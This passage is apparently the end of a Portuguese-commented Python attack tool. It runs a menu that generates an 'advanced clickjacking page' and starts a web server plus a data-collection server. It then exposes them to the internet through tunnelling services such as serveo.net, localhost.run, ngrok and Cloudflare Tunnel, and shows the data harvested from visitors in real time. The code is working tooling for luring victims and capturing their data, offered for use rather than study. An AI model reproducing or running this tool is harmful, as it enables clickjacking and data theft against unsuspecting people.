                UI.display_recent_data()
            
            Utils.log_activity(f"Dados coletados: {data_type}")
        except Exception as e:
            Utils.log_activity(f"Erro ao salvar dados: {e}")

# Servidor HTTP personalizado
class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=Config.WORK_DIR, **kwargs)
    
    def log_message(self, format, *args):
        # Silencia os logs padrão do servidor
        pass

# Gerenciador de servidores aprimorado
class ServerManager:
    @staticmethod
    def start_servers(display_data=False):
        try:
            # Configura o handler para exibir dados se necessário
            class CustomHandler(DataCollector):
                pass
            
            # Servidor web principal
            web_server = HTTPServer(('0.0.0.0', Config.PORT), CustomHTTPRequestHandler)
            web_thread = threading.Thread(target=web_server.serve_forever)
            web_thread.daemon = True
            
            # Servidor de coleta de dados
            data_server = HTTPServer(('0.0.0.0', Config.DATA_PORT), CustomHandler)
            data_server.display_data = display_data  # Adiciona flag para exibição
            data_thread = threading.Thread(target=data_server.serve_forever)
            data_thread.daemon = True
            
            web_thread.start()
            data_thread.start()
            
            print(f"{Colors.GREEN}[+] Servidor web rodando em http://localhost:{Config.PORT}{Colors.END}")
            print(f"{Colors.GREEN}[+] Servidor de dados rodando em http://localhost:{Config.DATA_PORT}{Colors.END}")
            Utils.log_activity("Servidores iniciados")
            
            return web_server, data_server
        except Exception as e:
            print(f"{Colors.RED}[-] Erro ao iniciar servidores: {e}{Colors.END}")
            Utils.log_activity(f"Falha ao iniciar servidores: {e}")
            return None, None

# Gerenciador de tunelamento
class TunnelManager:
    @staticmethod
    def start_tunnel(service):
        try:
            if service not in Config.TUNNELS:
                print(f"{Colors.RED}[-] Serviço de tunelamento desconhecido{Colors.END}")
                return
            
            if service == 'ngrok' and not TunnelManager._check_installed('ngrok'):
                print(f"{Colors.YELLOW}[!] Ngrok não está instalado.{Colors.END}")
                print("Instale com:")
                print("1. Baixe em https://ngrok.com/download")
                print("2. Extraia e mova para /usr/local/bin/")
                print("3. chmod +x /usr/local/bin/ngrok")
                print("4. ngrok authtoken SEU_TOKEN")
                return
            
            if service == 'cloudflared' and not TunnelManager._check_installed('cloudflared'):
                print(f"{Colors.YELLOW}[!] Cloudflared não está instalado.{Colors.END}")
                print("Instale com:")
                print("wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64")
                print("mv cloudflared-linux-amd64 /usr/local/bin/cloudflared")
                print("chmod +x /usr/local/bin/cloudflared")
                return
            
            cmd = Config.TUNNELS[service].format(Config.PORT)
            print(f"{Colors.YELLOW}[*] Iniciando {service}...{Colors.END}")
            Utils.log_activity(f"Iniciando tunelamento com {service}")
            
            # Abre em uma nova aba do terminal
            if os.name == 'posix':
                subprocess.Popen(['x-terminal-emulator', '--tab', '-e', 'bash', '-c', f'{cmd}; exec bash'])
            elif os.name == 'nt':
                subprocess.Popen(['start', 'cmd', '/k', cmd], shell=True)
            
            print(f"{Colors.GREEN}[+] Tunnel iniciado em uma nova aba{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] Erro ao iniciar tunnel: {e}{Colors.END}")
            Utils.log_activity(f"Erro no tunelamento: {e}")
    
    @staticmethod
    def _check_installed(program):
        return subprocess.call(['which', program], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

# Fluxo principal aprimorado
def main():
    try:
        # Configura ambiente
        os.makedirs(Config.WORK_DIR, exist_ok=True)
        os.makedirs(Config.COLLECT_DIR, exist_ok=True)
        os.chdir(Config.WORK_DIR)
        
        # Verifica Python 3
        if sys.version_info[0] < 3:
            print(f"{Colors.RED}[!] Python 3 é necessário{Colors.END}")
            sys.exit(1)
        
        UI.show_banner()
        
        # Menu principal
        while True:
            choice = UI.show_menu("MENU PRINCIPAL", [
                "Criar página de clickjacking avançada",
                "Iniciar servidores locais",
                "Iniciar servidores com exibição em tempo real",
                "Gerenciar tunelamento",
                "Visualizar dados coletados recentemente",
                "Visualizar todos os dados coletados",
                "Abrir no navegador local",
                "Sair"
            ])
            
            if choice == '1':
                PageGenerator.create_advanced_page()
                Utils.press_enter()
            elif choice == '2':
                ServerManager.start_servers()
                Utils.press_enter()
            elif choice == '3':
                ServerManager.start_servers(display_data=True)
                print(f"{Colors.GREEN}[+] Modo de exibição em tempo real ativado!{Colors.END}")
                print(f"{Colors.YELLOW}[*] Dados serão exibidos automaticamente quando recebidos{Colors.END}")
                Utils.press_enter()
            elif choice == '4':
                tunnel_choice = UI.show_menu("SERVIÇOS DE TUNELAMENTO", [
                    "Localhost.run",
                    "Serveo.net",
                    "Ngrok (requer configuração)",
                    "Cloudflare Tunnel (requer instalação)",
                    "Voltar"
                ])
                
                if tunnel_choice in ['1', '2', '3', '4']:
                    services = ['localhost.run', 'serveo.net', 'ngrok', 'cloudflared']
                    TunnelManager.start_tunnel(services[int(tunnel_choice)-1])
                    Utils.press_enter()
            elif choice == '5':
                UI.display_recent_data()
                Utils.press_enter()
            elif choice == '6':
                if os.path.exists(Config.COLLECT_DIR):
                    print(f"\n{Colors.CYAN}[ TODOS OS DADOS COLETADOS ]{Colors.END}")
                    os.system(f"ls -la {Config.COLLECT_DIR}")
                    print(f"\n{Colors.YELLOW}Use 'cat {Config.COLLECT_DIR}/<arquivo>' para visualizar{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Nenhum dado coletado ainda{Colors.END}")
                Utils.press_enter()
            elif choice == '7':
                webbrowser.open(f"http://localhost:{Config.PORT}")
                print(f"{Colors.GREEN}[+] Abrindo no navegador padrão...{Colors.END}")
                Utils.press_enter()
            elif choice == '8':
                print(f"{Colors.RED}[*] Saindo...{Colors.END}")
                Utils.log_activity("Aplicação encerrada")
                sys.exit(0)
            else:
                print(f"{Colors.RED}[!] Opção inválida{Colors.END}")
                Utils.press_enter()
                
            UI.show_banner()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrompido pelo usuário{Colors.END}")
        Utils.log_activity("Aplicação interrompida pelo usuário")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[-] Erro fatal: {e}{Colors.END}")
        Utils.log_activity(f"Erro fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
